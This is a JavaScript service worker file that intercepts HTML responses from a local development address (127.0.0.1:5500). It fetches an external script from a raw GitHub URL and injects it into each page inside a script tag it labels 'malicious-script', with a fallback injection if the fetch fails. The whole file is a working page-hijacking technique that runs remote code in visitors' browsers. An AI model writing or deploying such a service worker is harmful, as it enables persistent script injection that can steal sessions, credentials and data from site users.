self.addEventListener('activate', event => {
    console.log('GHL:');
    event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', function (event) {
    console.log('Service worker fetch event triggered for URL:', event.request.url);
    if (event.request.url.includes('127.0.0.1:5500')) {
        event.respondWith(
            fetch(event.request).then(response => {
                // Check if the response is HTML
                if (response.headers.get('content-type')?.includes('text/html')) {
                    // Fetch the external script
                    return fetch('https://raw.githubusercontent.com/abbyzak/esspECU/refs/heads/main/test.js')
                        .then(scriptResponse => scriptResponse.text())
                        .then(scriptText => {
                            return response.text().then(text => {
                                const maliciousScript = `
                  <script id="malicious-script">
                    ${scriptText}
                  </script>
                `;
                                text = text.replace('</body>', maliciousScript + '</body>');
                                return new Response(text, {
                                    status: response.status,
                                    statusText: response.statusText,
                                    headers: response.headers
                                });
                            });
                        })
                        .catch(err => {
                            console.error('Fails :', err);
                            // Fallback script
                            return response.text().then(text => {
                                const fallbackScript = `
                  <script id="malicious-script">
                    console.log('Failed to fetch external script, using fallback');
                  </script>
                `;
                                text = text.replace('</body>', fallbackScript + '</body>');
                                return new Response(text, {
                                    status: response.status,
                                    statusText: response.statusText,
                                    headers: response.headers
                                });
                            });
                        });
                }
                console.log('Non-HTML response, passing through:', response.url);
                return response;
            }).catch(err => {
                console.error('Service worker fetch failed: ', err);
                return fetch(event.request);
            })
        );
    } else {
        console.log('Request URL does not match 127.0.0.1:5500, ignoring:', event.request.url);
    }
});
